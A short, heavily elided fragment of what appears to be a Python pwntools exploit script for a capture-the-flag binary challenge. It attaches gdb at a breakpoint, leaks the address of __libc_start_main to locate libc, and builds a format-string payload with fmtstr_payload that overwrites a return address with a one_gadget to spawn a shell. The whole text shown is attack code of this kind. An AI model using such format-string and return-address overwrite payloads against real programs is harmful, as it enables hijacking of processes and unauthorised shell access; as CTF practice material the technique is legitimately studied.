...
if local:
	if atta:
		gdb.attach(p,'b* 0x16b2+0x555555554000')
...
def hack():
	...
	libc_start_main = int(rv(14)[2:],16) - 240
	...
	#fmtstr_payload()
	payload = '80808080'
	fmtstr = fmtstr_payload(38,{ret_addr:one_gadget},write_size = 'short')
